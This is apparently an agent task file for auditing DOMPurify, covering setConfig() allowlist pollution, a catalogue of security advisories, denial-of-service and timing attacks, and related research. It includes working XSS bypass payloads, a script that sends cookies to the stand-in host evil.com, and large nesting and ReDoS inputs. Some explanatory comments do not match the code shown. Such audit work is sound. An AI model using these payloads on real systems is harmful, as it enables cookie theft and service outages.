# AGENT TASK: Config API Exploitation, GHSA Inventory, Performance Attacks
# PURPOSE: setConfig() state pollution, 23+ GHSA advisories, ReDoS/timing attacks
# PRIORITY: Run for multi-tenant and shared-instance deployments
# INPUTS: DOMPurify usage patterns, whether setConfig() is used
# OUTPUT: setConfig() pollution findings, GHSA matches, performance attack results
# SECTIONS: F8 (setConfig), F9 (GHSA Inventory), F10 (Performance), F11 (Academic Research)
---

## SECTION F8: setConfig() — The Most Dangerous Undocumented API

### Overview

`setConfig()` is the single most dangerous under-documented API in DOMPurify. While `DOMPurify.sanitize()` is thoroughly analyzed by security researchers, `setConfig()` receives almost no scrutiny despite fundamentally altering the security model of every subsequent `sanitize()` call. Its danger stems from a single implementation detail: **it sets the `SET_CONFIG` flag, causing `sanitize()` to skip `_parseConfig()` entirely**.

### Mechanism: How setConfig() Bypasses Safety Guards

When `sanitize()` is called normally, it invokes `_parseConfig(cfg)` which performs several critical safety operations:

```javascript
// Simplified flow inside DOMPurify.sanitize()
const sanitize = function (dirty, cfg) {
  if (!SET_CONFIG) {
    _parseConfig(cfg);   // <-- setConfig() causes this to be SKIPPED
  }
  // ... sanitization proceeds with whatever state exists ...
};
```

The `_parseConfig()` function is not merely a "configuration parser" — it is a **security boundary reset**. Skipping it disables:

1. **Clone-guards for ALLOWED_ATTR/ALLOWED_TAGS allowlists** — Without `_parseConfig()`, the allowlists used during sanitization are the LIVE internal objects, not defensive copies. Any hook or callback that receives these objects can mutate them permanently.

2. **Clearing of function predicates from ADD_TAGS/ADD_ATTR** — Function predicates stored in `EXTRA_ELEMENT_HANDLING` are only cleared when `_parseConfig()` runs and the corresponding key is missing from the config or present as an array. Without `_parseConfig()`, stale predicates from previous calls survive indefinitely.

3. **Trusted Types policy reset** — The Trusted Types policy object is re-created during `_parseConfig()`. Skipping it means a policy created with one configuration continues to govern sanitization under a different configuration, potentially with mismatched security assumptions.

4. **Re-initialization of hook isolation (allowlist forking)** — Hooks receive forked copies of allowlists during `_parseConfig()`. Without the fork, hooks operate on shared mutable state.

### CVE-2026-65898 (GHSA-cmwh-pvxp-8882): setConfig + uponSanitizeAttribute Allowlist Pollution

**Severity:** Low (CVSS 3.7) — but catastrophic in multi-tenant environments.

**Root cause:** When `setConfig()` is used, the `uponSanitizeAttribute` hook receives a LIVE shared reference to `ALLOWED_ATTR`, not a defensive copy.

```javascript
// Attacker-controlled hook registration
DOMPurify.addHook('uponSanitizeAttribute', function (node, data) {
  // data.allowedAttributes is a DIRECT REFERENCE to ALLOWED_ATTR
  // This mutation is permanent for the DOMPurify instance lifetime
  data.allowedAttributes['onerror'] = true;
  data.allowedAttributes['onload'] = true;
  data.allowedAttributes['onfocus'] = true;
});

// First call with setConfig — triggers the vulnerability
DOMPurify.setConfig({ ALLOWED_TAGS: ['div', 'span', 'p'] });
DOMPurify.sanitize('<div onerror="alert(1)">test</div>');

// Even after removing all hooks, the allowlist is permanently widened
DOMPurify.removeAllHooks();

// Even after clearConfig(), the damage persists
// because clearConfig() resets CONFIG but not the polluted DEFAULT sets
DOMPurify.clearConfig();

// This STILL allows onerror through:
DOMPurify.sanitize('<img src=x onerror="alert(1)">');
// Output: <img src="x" onerror="alert(1)">
```

**Why this survives cleanup:**

- `removeAllHooks()` only clears the hook registry — it does not undo mutations the hooks already performed.
- `clearConfig()` resets the `CONFIG` object and `SET_CONFIG` flag, but the internal `ALLOWED_ATTR` set was already mutated in-place.
- Per-call `FORBID_ATTR: ['onerror']` is checked AFTER the allowlist check in some code paths, but the precedence logic assumes the allowlist was never externally widened.

**Exploitation scenario (multi-tenant SaaS):**

```javascript
// Shared DOMPurify instance across tenants (common anti-pattern)
const purifier = DOMPurify(window);

// Tenant A registers a "legitimate" hook for custom attribute handling
purifier.addHook('uponSanitizeAttribute', function (node, data) {
  // Bug or intentional: writes to the shared allowlist
  if (data.attrName === 'data-custom') {
    data.allowedAttributes['onclick'] = true; // "needed for our widget"
  }
});

// Tenant A's call triggers the mutation
purifier.setConfig({ ALLOWED_TAGS: ['div'] });
purifier.sanitize('<div data-custom="x">A</div>');

// Tenant B's content is now vulnerable — onclick passes through
purifier.removeAllHooks(); // Tenant A's hooks removed, but damage done
purifier.sanitize('<div onclick="stealCookies()">B</div>');
// Output: <div onclick="stealCookies()">B</div>
```

### Function Predicate State Leakage (GHSA-9p3w-6h5p-cv75, CVE-2026-65911)

**Severity:** Moderate (CVSS 5.9)

`ADD_ATTR` and `ADD_TAGS` accept function predicates that are evaluated per-element/attribute during sanitization. These predicates are stored internally in `EXTRA_ELEMENT_HANDLING` (or equivalent internal state). The critical flaw: `_parseConfig()` clears them only when the corresponding key is **MISSING** from the config object — not when the key is present as an empty array.

```javascript
// Call 1: Register a function predicate that allows onclick
DOMPurify.sanitize('<div onclick="alert(1)">test</div>', {
  ADD_ATTR: function (attr) {
    return attr === 'onclick'; // Allow onclick
  }
});
// Output: <div onclick="alert(1)">test</div> — intended

// Call 2: Attempt to use a "clean" config with explicit empty array
DOMPurify.sanitize('<div onclick="alert(1)">test</div>', {
  ADD_ATTR: []  // Developer intends: "no additional attributes"
});
// VULNERABLE: The function predicate from Call 1 PERSISTS
// because ADD_ATTR is present in config (as []), so _parseConfig
// does not clear the predicate — it only clears when key is ABSENT
// Output: <div onclick="alert(1)">test</div> — UNINTENDED

// Call 3: Only omitting ADD_ATTR entirely clears the predicate
DOMPurify.sanitize('<div onclick="alert(1)">test</div>', {
  ALLOWED_TAGS: ['div']
  // ADD_ATTR not present → _parseConfig clears predicate
});
// Output: <div>test</div> — correct
```

**Server-side exploitation (Node.js with jsdom):**

```javascript
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Shared instance handles requests from different users
async function handleRequest(userHTML, userConfig) {
  return DOMPurify.sanitize(userHTML, userConfig);
}

// Request 1 (malicious): Registers a function predicate
await handleRequest('<p>hello</p>', {
  ADD_TAGS: function (tag) {
    return tag === 'script'; // Allows <script> tags
  }
});

// Request 2 (victim): Uses ADD_TAGS as array, predicate persists
await handleRequest(
  '<div><script>document.location="https://evil.com/"+document.cookie</script></div>',
  { ADD_TAGS: ['b', 'i'] }  // Intends to only add <b> and <i>
);
// RESULT: <script> passes through because stale predicate allows it
```

### Hook Mutation Persistence (GHSA-76mc-f452-cxcm)

**Severity:** Moderate (CVSS 5.4)

The `data.allowedTags` and `data.allowedAttributes` objects passed to hooks (`uponSanitizeElement`, `uponSanitizeAttribute`) are **DIRECT REFERENCES** to the live internal sets — not copies.

Under the **default configuration** (no custom `ALLOWED_TAGS`/`ALLOWED_ATTR`), these point directly to `DEFAULT_ALLOWED_TAGS` and `DEFAULT_ALLOWED_ATTR`. A hook that writes to them changes the defaults for the **entire instance lifetime**.

```javascript
// This hook looks innocuous but permanently corrupts defaults
DOMPurify.addHook('uponSanitizeElement', function (node, data) {
  // Intended: "also allow <details> for this call"
  // Actual: permanently adds <script> to DEFAULT allowed tags
  data.allowedTags['script'] = true;
});

// First sanitize — hook runs and mutates defaults
DOMPurify.sanitize('<p>Safe content</p>');

// Remove the hook — developer thinks they cleaned up
DOMPurify.removeAllHooks();

// clearConfig — developer thinks defaults are restored
DOMPurify.clearConfig();

// But DEFAULT_ALLOWED_TAGS was mutated in-place
// <script> is now permanently allowed:
const result = DOMPurify.sanitize('<script>alert(document.cookie)</script>');
// result: <script>alert(document.cookie)</script>
```

**Why cleanup APIs fail:**

| Cleanup Method | Undoes Hook Mutations? | Reason |
|---|---|---|
| `removeAllHooks()` | NO | Clears hook registry, not mutations hooks already made |
| `clearConfig()` | NO | Resets CONFIG and SET_CONFIG flag, not DEFAULT_* sets |
| `setConfig({})` | NO | Only sets SET_CONFIG flag |
| Per-call config | PARTIAL | New ALLOWED_TAGS replaces pointer but DEFAULT_* still polluted |
| New instance | YES | Only reliable way to get clean defaults |

**Detection pattern:**

```javascript
// Audit: Check if DEFAULT sets have been mutated
function auditDOMPurifyDefaults(DOMPurify) {
  const instance = DOMPurify();
  // Create a fresh instance to compare against
  const fresh = DOMPurify();

  // Sanitize with no config to exercise defaults
  const test = '<script>alert(1)</script><iframe src="javascript:alert(1)">';

  const existingResult = instance.sanitize(test);
  const freshResult = fresh.sanitize(test);

  if (existingResult !== freshResult) {
    console.error('DEFAULT SETS MUTATED — DOMPurify instance compromised');
    console.error('Existing:', existingResult);
    console.error('Fresh:', freshResult);
    return false;
  }
  return true;
}
```

### Audit Checklist for setConfig()

```
[ ] Never use setConfig() in multi-tenant environments
[ ] If using setConfig(), create fresh DOMPurify instances per tenant
[ ] Audit all hooks for writes to data.allowedTags / data.allowedAttributes
[ ] Verify function predicates are explicitly cleared between calls
    (omit ADD_TAGS/ADD_ATTR from config entirely, do not pass empty arrays)
[ ] Check Trusted Types policy lifecycle after clearConfig()
[ ] Test that removeAllHooks() + clearConfig() actually restores intended behavior
[ ] Consider creating new DOMPurify instances instead of reconfiguring existing ones
[ ] On server-side (Node.js): NEVER share DOMPurify instances across requests
[ ] Grep codebase for setConfig, addHook mutations, and ADD_TAGS/ADD_ATTR functions
[ ] In CI: run differential tests comparing shared-instance vs fresh-instance output
```

---

## SECTION F9: Complete GitHub Security Advisory Inventory

Full catalog of 23+ DOMPurify security advisories (2024-2026), organized by severity.

### Critical Severity

**GHSA-p3vf-v8qc-cwcr (CVE-2024-45801) — Prototype Pollution Depth Bypass**
- **CVSS:** 9.1
- **Affected:** DOMPurify < 3.1.3
- **Vector:** Prototype pollution of nested config objects causes security-critical checks to be bypassed. An attacker who can pollute `Object.prototype` can inject properties that alter DOMPurify's behavior, effectively downgrading its sanitization.
- **Fix:** Deep-freeze config objects; explicit `hasOwnProperty` checks on all config lookups.

**GHSA-gx9m-whjm-85jf (CVE-2024-47875) — Nesting-Based mXSS**
- **CVSS:** 10.0 (Maximum)
- **Affected:** DOMPurify < 3.1.7
- **Vector:** Deeply nested HTML structures exploit the 512-element nesting limit in WebKit/Blink parsers. When the parser flattens elements beyond this depth, the resulting DOM structure differs from what DOMPurify sanitized, creating a mutation XSS. The serialize-reparse cycle produces executable content that was not present in the sanitized output.
- **Impact:** Complete XSS bypass affecting all major browsers.
- **Fix:** Pre-flatten deeply nested structures before sanitization; depth-aware TreeWalker.

### High Severity

**GHSA-mmhx-hmjr-r674 — Prototype Pollution Variant 2**
- **CVSS:** 7.5
- **Affected:** DOMPurify < 3.1.4
- **Vector:** Second prototype pollution vector discovered after the CVE-2024-45801 fix. Targets a different config parsing path that was not covered by the initial remediation.
- **Fix:** Comprehensive audit of all config access paths; property descriptor checks.

**GHSA-87xg-pxx2-7hvx (CVE-2026-47423) — selectedcontent Re-Clone (Engine-Deferred Mutation)**
- **CVSS:** 8.2
- **Affected:** DOMPurify < 3.4.7
- **Vector:** Chrome's `<selectedcontent>` element (shipped in Chrome 136+) triggers deferred DOM mutation. DOMPurify sanitizes the initial tree, but the browser's selection API re-clones content into the element after sanitization, potentially introducing unsanitized nodes.
- **Fix:** Strip `<selectedcontent>` elements; add to `FORBID_TAGS` by default.

### Moderate Severity (Complete List)

**GHSA-h8r8-wccr-v5f2 (CVE-2026-0540) — Rawtext Element Omissions**
- **CVSS:** 5.3
- **Affected:** DOMPurify < 3.4.2
- **Vector:** Certain rawtext elements (elements whose content is parsed as raw text rather than HTML) were not included in DOMPurify's internal blocklist. Content inside these elements could break out of the rawtext parsing context and be interpreted as HTML.
- **Payload example:**
```html
<xmp><img src=x onerror=alert(1)></xmp>
```

**GHSA-cjmm-f4jc-qw8r (CVE-2026-65912) — ADD_ATTR Skips URI Validation**
- **CVSS:** 5.9
- **Affected:** DOMPurify < 3.4.3
- **Vector:** Attributes added via `ADD_ATTR` bypass the `_isValidAttribute()` URI scheme check. An attribute like `href` added through `ADD_ATTR` accepts `javascript:` URIs that would normally be blocked.
- **Exploit:**
```javascript
DOMPurify.sanitize('<a href="javascript:alert(1)">click</a>', {
  ADD_ATTR: ['href']  // href already allowed, but ADD_ATTR path skips URI check
});
// Vulnerable output: <a href="javascript:alert(1)">click</a>
```

**GHSA-cj63-jhhr-wcxv (CVE-2026-65913) — USE_PROFILES Prototype Pollution**
- **CVSS:** 5.4
- **Affected:** DOMPurify < 3.4.3
- **Vector:** `USE_PROFILES` config option iterates profile keys without `hasOwnProperty` guard. Polluted prototype properties are treated as valid profile names, potentially loading attacker-controlled tag/attribute sets.

**GHSA-v9jr-rg53-9pgp (CVE-2026-41238) — CUSTOM_ELEMENT_HANDLING Prototype Pollution Fallback**
- **CVSS:** 5.4
- **Affected:** DOMPurify < 3.4.4
- **Vector:** When `CUSTOM_ELEMENT_HANDLING` is configured, fallback behavior for unrecognized properties reads from the prototype chain. Polluted prototypes can inject `tagNameCheck` or `attributeNameCheck` functions that allow arbitrary elements/attributes.

**GHSA-39q2-94rc-95cp (CVE-2026-65903) — ADD_TAGS Function Short-Circuit**
- **CVSS:** 5.9
- **Affected:** DOMPurify < 3.4.4
- **Vector:** When `ADD_TAGS` is a function predicate, and that function returns `true` for a given tag, the sanitizer short-circuits and skips all further checks for that element — including namespace validation, content model checks, and attribute sanitization of the element's children.
```javascript
DOMPurify.sanitize(payload, {
  ADD_TAGS: function (tag) {
    return tag === 'math'; // Intends to allow <math>
    // Side effect: skips ALL checks for <math> and its subtree
  }
});
```

**GHSA-crv5-9vww-q3g8 (CVE-2026-41239) — SAFE_FOR_TEMPLATES DOM Bypass**
- **CVSS:** 5.3
- **Affected:** DOMPurify < 3.4.5
- **Vector:** `SAFE_FOR_TEMPLATES` mode uses regex-based escaping on serialized output. Certain DOM structures produce serialized forms where the regex fails to match template delimiters, allowing `{{` and `}}` patterns to survive in attribute values.

**GHSA-h7mw-gpvr-xq4m (CVE-2026-41240) — FORBID_TAGS Bypassed by ADD_TAGS Function**
- **CVSS:** 6.1
- **Affected:** DOMPurify < 3.4.5
- **Vector:** `ADD_TAGS` function predicates are evaluated BEFORE `FORBID_TAGS` array checks. If a function predicate returns `true`, the tag is allowed regardless of `FORBID_TAGS` entries.
```javascript
DOMPurify.sanitize('<script>alert(1)</script>', {
  ADD_TAGS: function () { return true; }, // Allows everything
  FORBID_TAGS: ['script']  // Developer expects this to block <script>
});
// Output: <script>alert(1)</script>  — FORBID_TAGS ignored
```

**GHSA-hpcv-96wg-7vj8 (CVE-2026-49458) — Cross-Realm IN_PLACE Bypass**
- **CVSS:** 6.4
- **Affected:** DOMPurify < 3.4.6
- **Vector:** `IN_PLACE: true` mode sanitizes the DOM node directly without cloning. When the input node originates from a different realm (iframe, web worker message), `instanceof` checks fail silently, causing certain dangerous node types to pass through unrecognized.

**GHSA-r47g-fvhr-h676 — Clobbered Root Element IN_PLACE**
- **CVSS:** 5.4
- **Affected:** DOMPurify < 3.4.6
- **Vector:** DOM clobbering of the root element in `IN_PLACE` mode. If the input element has properties clobbered by child elements (e.g., a child with `id="nodeName"`), DOMPurify's `nodeName` checks operate on the clobbered value rather than the actual element type.

**GHSA-76mc-f452-cxcm — Hook Mutation Pollutes Default Allowlists**
- **CVSS:** 5.4
- **Affected:** DOMPurify < 3.4.7
- **Vector:** Hooks receive direct references to `DEFAULT_ALLOWED_TAGS` / `DEFAULT_ALLOWED_ATTR`. Mutations persist across all subsequent calls and survive `removeAllHooks()` and `clearConfig()`. See Section F8 for full analysis.

**GHSA-rp9w-3fw7-7cwq (CVE-2026-49978) — Shadow Root in Template Bypass**
- **CVSS:** 5.9
- **Affected:** DOMPurify < 3.4.8
- **Vector:** Declarative shadow roots inside `<template>` elements create shadow trees that DOMPurify's TreeWalker does not traverse. Content inside the shadow root (including event handlers and `<script>` elements) survives sanitization.
```html
<div>
  <template shadowrootmode="open">
    <script>alert(document.cookie)</script>
  </template>
</div>
```

**GHSA-9p3w-6h5p-cv75 (CVE-2026-65911) — Predicate State Leakage**
- **CVSS:** 5.9
- **Affected:** DOMPurify < 3.4.4
- **Vector:** Function predicates in `ADD_ATTR`/`ADD_TAGS` persist across `sanitize()` calls when the config key is present (even as empty array). See Section F8 for full analysis.

### Low Severity

**GHSA-x4vx-rjvf-j5p4 — nodeName Trust in IN_PLACE**
- **CVSS:** 3.1
- **Affected:** DOMPurify < 3.4.6
- **Vector:** `IN_PLACE` mode trusts the `nodeName` property of input nodes without verifying against DOM clobbering. In contexts where the attacker controls the input DOM structure, `nodeName` can be overridden via `id` attribute clobbering.

**GHSA-gvmj-g25r-r7wr — SAFE_FOR_TEMPLATES Template Content DOM Bypass**
- **CVSS:** 3.7
- **Affected:** DOMPurify < 3.4.5
- **Vector:** `SAFE_FOR_TEMPLATES` regex operates on serialized HTML. Template directives embedded in DOM structures that serialize differently than expected (e.g., inside SVG `<desc>` or `<title>`) can bypass the regex.

**GHSA-vxr8-fq34-vvx9 (CVE-2026-65899) — Trusted Types Policy Persistence**
- **CVSS:** 3.1
- **Affected:** DOMPurify < 3.4.3
- **Vector:** Trusted Types policy created during one `sanitize()` call with `RETURN_TRUSTED_TYPE: true` persists after `clearConfig()`. Subsequent calls without `RETURN_TRUSTED_TYPE` may still return Trusted Type objects, causing type mismatches in consuming code.

**GHSA-cmwh-pvxp-8882 — ALLOWED_ATTR Pollution via setConfig**
- **CVSS:** 3.7
- **Affected:** DOMPurify < 3.4.7
- **Vector:** `setConfig()` combined with hooks allows permanent mutation of `ALLOWED_ATTR`. See Section F8 (CVE-2026-65898) for full analysis.

**GHSA-c2j3-45gr-mqc4 (CVE-2026-66010) — Custom Element Hook Bypass**
- **CVSS:** 3.7
- **Affected:** DOMPurify < 3.4.8
- **Vector:** Custom elements matched by `CUSTOM_ELEMENT_HANDLING.tagNameCheck` bypass `uponSanitizeElement` hooks. Security-critical hooks that rely on seeing every element miss custom elements entirely.

**GHSA-55q2-fjhq-7xh7 — Hook Detach Leaves Subtree Executable**
- **CVSS:** 3.1
- **Affected:** DOMPurify < 3.4.8
- **Vector:** When a hook calls `node.remove()` to detach an element, its subtree is removed from the TreeWalker's traversal but remains attached to the detached node. If the detached subtree is later reinserted into the document (e.g., by application code that processes "removed" nodes), its unsanitized children execute.

### Advisory Gap Analysis

Many Low-severity advisories were **never assigned CVEs**, meaning CVE databases alone miss significant security issues. Organizations relying solely on CVE feeds (NVD, Mitre) for vulnerability management will miss at minimum 5 known DOMPurify security issues. GitHub Security Advisories (GHSA) remain the authoritative source.

---

## SECTION F10: Performance-Based Attack Surface

### ReDoS via Custom ALLOWED_URI_REGEXP

DOMPurify's documentation contains a critical but often-overlooked warning:

> "Only linear-time patterns should be used."

The **default URI regex** is safe — it was specifically designed to avoid catastrophic backtracking. However, the `ALLOWED_URI_REGEXP` config option accepts arbitrary user-supplied patterns with **no validation**:

```javascript
// DANGEROUS: Custom regex with catastrophic backtracking
DOMPurify.sanitize(payload, {
  ALLOWED_URI_REGEXP: /^(?:https?:\/\/(?:[a-z0-9]+\.)*(?:[a-z0-9]+\.)+[a-z]{2,}(?:\/[^\s]*)*|data:image\/(?:png|jpe?g|gif|webp);base64,[A-Za-z0-9+/=]+)$/i
});

// Attacker-controlled URI that triggers catastrophic backtracking:
const maliciousURI = 'https://' + 'a.'.repeat(50000) + 'x';
// The nested quantifiers (.*)* and repetitive alternation cause
// exponential backtracking on non-matching input
```

**Impact:** On server-side DOMPurify (Node.js), a single request with a crafted URI value can block the event loop for minutes, causing denial of service for all concurrent requests.

**Mitigation:**
```javascript
// SAFE: Use RE2 or linear-time regex libraries on server-side
const RE2 = require('re2');
const safePattern = new RE2('^https?://[\\w.-]+(?:/[\\w.-]*)*$');

// Or validate regex complexity before passing to DOMPurify
function isLinearTimeRegex(pattern) {
  // Reject patterns with nested quantifiers
  return !/(\+|\*|\{)\s*(\+|\*|\{)/.test(pattern.source) &&
         !/\(\?[^)]*(\+|\*)\)(\+|\*|\?)/.test(pattern.source);
}
```

### Algorithmic Complexity via Deep Nesting

The 512-level nesting limit in WebKit/Blink (WebKit bug 63082) was exploited in CVE-2024-47875 for mXSS. Beyond the mXSS vector, deep nesting creates performance attack surfaces:

```javascript
// Generate deeply nested input
function generateDeepNesting(depth) {
  let html = '';
  for (let i = 0; i < depth; i++) html += '<div>';
  html += 'payload';
  for (let i = 0; i < depth; i++) html += '</div>';
  return html;
}

// 10,000 levels of nesting
const deepInput = generateDeepNesting(10000);

// Performance characteristics:
// - DOM parsing: O(n) but with large constant factor per nesting level
// - TreeWalker traversal: O(n) nodes
// - node.normalize(): O(n) but expensive on deeply nested text nodes
//   (coalesces adjacent text nodes, requires tree walks)
// - Serialization: O(n) with string concatenation costs
```

**DOMPurify has no built-in input size or depth limit.** Applications must implement their own:

```javascript
function safeSanitize(input, config) {
  // Size limit
  if (input.length > 1_000_000) {
    throw new Error('Input exceeds maximum size (1MB)');
  }

  // Rough depth limit (heuristic: count unclosed tags)
  const openTags = (input.match(/<[a-z][^/]*>/gi) || []).length;
  const closeTags = (input.match(/<\/[a-z]+>/gi) || []).length;
  if (openTags > 1000 || (openTags - closeTags) > 500) {
    throw new Error('Input nesting depth exceeds safety limit');
  }

  return DOMPurify.sanitize(input, config);
}
```

### Memory Exhaustion

DOMPurify's sanitization pipeline involves a full DOM round-trip: **parse string to DOM tree, traverse with TreeWalker, serialize back to string**. Each phase allocates significant memory:

```
Input String (N bytes)
  → DOM Tree (~3-5x N bytes: node objects, attributes, text nodes)
    → TreeWalker traversal (iterator state, hook call stack frames)
      → Serialized Output (~N bytes)
```

**No size limit exists in DOMPurify.** A multi-megabyte string creates proportionally large DOM trees:

| Input Size | Approximate Memory | Parse Time (jsdom) | Parse Time (browser) |
|---|---|---|---|
| 100 KB | ~500 KB | ~50ms | ~10ms |
| 1 MB | ~5 MB | ~500ms | ~100ms |
| 10 MB | ~50 MB | ~5s | ~1s |
| 50 MB | ~250 MB | ~30s | ~5s |

**Server-side (jsdom) is significantly worse** due to:
- JavaScript-based DOM implementation (vs. native C++ in browsers)
- V8 garbage collector pauses on large object graphs
- Single-threaded event loop blocks all other requests

```javascript
// DoS attack against server-side DOMPurify
// Send a 50MB payload to an endpoint that sanitizes input
const payload = '<div>'.repeat(1_000_000) + 'x' + '</div>'.repeat(1_000_000);
// This creates ~2M DOM nodes, consuming ~250MB and blocking for ~30s
```

### SAFE_FOR_XML Regex Cost

When `SAFE_FOR_XML` is enabled (default: `true`), a regex is applied to **every attribute value on every element**:

```javascript
// Simplified internal behavior
if (SAFE_FOR_XML) {
  value = value.replace(/\u0000/g, '') // Null byte removal
               .replace(/[\x01-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]/g, ''); // Control chars
  // Additional processing for XML-unsafe characters
}
```

While each individual regex application is O(n) where n is the attribute value length, the cumulative cost on a document with thousands of attributes is significant:

```javascript
// Worst case: many elements with many long attributes
let payload = '';
for (let i = 0; i < 10000; i++) {
  payload += `<div ${'data-x'.padEnd(20, i)}="${'a'.repeat(10000)}">`;
}
// 10,000 elements x 10,000-char attributes = 100M regex operations
```

### Timing Side Channels

DOMPurify's processing time varies based on input characteristics, creating potential timing side channels:

| Input Characteristic | Effect on Processing Time |
|---|---|
| Number of elements | Linear increase |
| Blocked elements (removal) | Additional DOM manipulation ops |
| Number of hooks registered | Per-element/attribute callback overhead |
| `SAFE_FOR_XML` matches | Regex replacement cost |
| `SAFE_FOR_TEMPLATES` matches | Additional regex pass |
| Custom element handling | `tagNameCheck` / `attributeNameCheck` evaluation |
| URI validation | `ALLOWED_URI_REGEXP` evaluation per URI attribute |

**Exploitation scenario:** An attacker submits content and measures response times to determine:
- Whether specific elements were blocked (response faster = element removed without full processing)
- Whether specific hooks are registered (response slower = hook evaluation overhead)
- The sanitization configuration in use (different configs produce different timing profiles)

```javascript
// Timing oracle: determine if <script> is in FORBID_TAGS
const t1 = performance.now();
sanitizeEndpoint('<script>'.repeat(1000));
const blocked = performance.now() - t1;

const t2 = performance.now();
sanitizeEndpoint('<div>'.repeat(1000));
const allowed = performance.now() - t2;

// If blocked << allowed, <script> is in FORBID_TAGS (removed early)
// If blocked >> allowed, <script> triggers hook processing before removal
```

---

## SECTION F11: Academic Research Gap Analysis

### "In the DOM We Trust" (ACM CCS 2025)

**Citation:** Khodayari et al., "In the DOM We Trust: A Large-Scale Study of DOM-Based Cross-Site Scripting", ACM CCS 2025.

**Methodology:**
- Crawled 522,000 pages from the top 15,000 Tranco domains
- Identified 2.6 million DOM-to-sink flows using taint tracking
- Verified 657 end-to-end vulnerabilities across 37 distinct sites

**Key finding:** 77.2% of verified gadgets were **NEW types** not covered by prior DOM XSS research taxonomies. This fundamentally challenges the assumption that DOM XSS is a well-understood vulnerability class.

**Implications for DOMPurify:**
Post-sanitization DOM reads can create new injection paths that DOMPurify cannot prevent:

```javascript
// DOMPurify sanitizes the HTML correctly
const clean = DOMPurify.sanitize(userInput);
container.innerHTML = clean;

// But application code reads sanitized DOM and creates NEW sinks
const title = container.querySelector('[data-title]').dataset.title;
document.title = title; // DOM property write — no XSS

// The study found flows like:
const config = container.querySelector('[data-config]').textContent;
eval(config); // Application re-interprets sanitized content as code
// DOMPurify allowed the text content (it's inert HTML)
// but the application's DOM read created a code injection sink
```

The study demonstrates that sanitization is necessary but not sufficient — applications create secondary injection paths by reading sanitized DOM and using the values in dangerous sinks.

**Source:** https://trouge.net/papers/in_the_dom_we_trust_ccs25.pdf

### Hulk: DOM Clobbering at Scale (USENIX Security 2025)

**Citation:** Liu et al., "Hulk: Finding DOM Clobbering Gadgets at Scale", USENIX Security 2025.

**Results:**
- Discovered **497 zero-day DOM clobbering gadgets** across Tranco Top 5,000 sites
- **378 XSS** vulnerabilities, **90 CSRF** vulnerabilities, **26 open redirects**
- **19 CVEs assigned** from the research
- Of **29 sanitizers tested, 16 were vulnerable** to DOM clobbering markup

**DOMPurify-specific findings:**
DOMPurify blocks known clobbering vectors (`id` and `name` attributes on dangerous elements) but the Hulk framework found clobbering patterns that survive sanitization:

```html
<!-- DOMPurify allows id attributes on most elements -->
<form id="x"><input name="action" value="javascript:alert(1)"></form>

<!-- Post-sanitization, application code accesses: -->
<!-- document.getElementById('x').action → "javascript:alert(1)" -->
<!-- This is a DOM clobbering gadget that DOMPurify cannot prevent -->
<!-- because id and name attributes are legitimate HTML -->
```

The research highlights a fundamental limitation: DOMPurify cannot block all DOM clobbering without breaking legitimate HTML patterns. Applications must implement their own clobbering defenses in addition to sanitization.

**Source:** https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf

### TU Braunschweig: Parsing Differentials and MutaGen

**Citation:** Wichelmann et al., "Parsing Differentials: Universal Exploit Primitives for Browser Sanitizers", TU Braunschweig.

**MutaGen Framework:**
- Generated **12 million mutation payloads** through systematic fuzzing
- Tested against **11 sanitizers** across multiple browsers
- Found **16 bypasses** (unique sanitizer + browser combinations)

**Key finding:** Every sanitizer tested except `sanitize-html` and `loofah` had at least one bypass. The bypasses were found by exploiting **parsing differentials** — differences in how the sanitizer's parser and the browser's parser interpret the same HTML.

**DOMPurify-specific implications:**
DOMPurify parses HTML using the browser's own parser (via `document.createElement` or `DOMParser`), which should eliminate parsing differentials. However:

1. **Server-side:** jsdom's HTML parser differs from browser parsers in edge cases
2. **Fragment vs. document parsing:** `innerHTML` on a `<template>` vs. `DOMParser.parseFromString()` handle certain constructs differently
3. **Context-dependent parsing:** The same HTML parsed in different element contexts produces different DOM trees

```javascript
// Parsing differential between <template> and <div> contexts
const template = document.createElement('template');
template.innerHTML = '<svg><desc><table><svg><style>x</style></svg></table></desc></svg>';

const div = document.createElement('div');
div.innerHTML = '<svg><desc><table><svg><style>x</style></svg></table></desc></svg>';

// template.content and div may have different DOM structures
// due to different parsing contexts (HTML vs. foreign content)
```

**Source:** https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf

### SonarSource mXSS Cheatsheet

A comprehensive, continuously maintained reference of mXSS payloads organized by vector type and affected parser/sanitizer. The cheatsheet includes:

- **44+ distinct mXSS payload patterns**
- Browser-specific behavior annotations
- Sanitizer bypass status tracking
- Parsing differential documentation

Critical resource for testing DOMPurify configurations against known mXSS vectors.

**Source:** https://sonarsource.github.io/mxss-cheatsheet

### Research Gaps Identified

Based on the academic literature survey, the following areas remain under-researched:

1. **Post-sanitization mutation observers** — No systematic study of how MutationObserver callbacks interact with sanitized content.
2. **Web Component lifecycle timing** — Custom element `connectedCallback`/`attributeChangedCallback` execute after sanitized content is inserted; these callbacks may introduce new sinks.
3. **Service worker interception** — Service workers can intercept and modify sanitized content before it reaches the DOM.
4. **CSS-only exfiltration from sanitized content** — While DOMPurify strips `<style>` by default, allowed CSS attributes may enable data exfiltration via font-loading side channels.
5. **WebAssembly-based sanitization** — No research on whether WASM-based sanitizers avoid the parsing differential problem entirely.

---
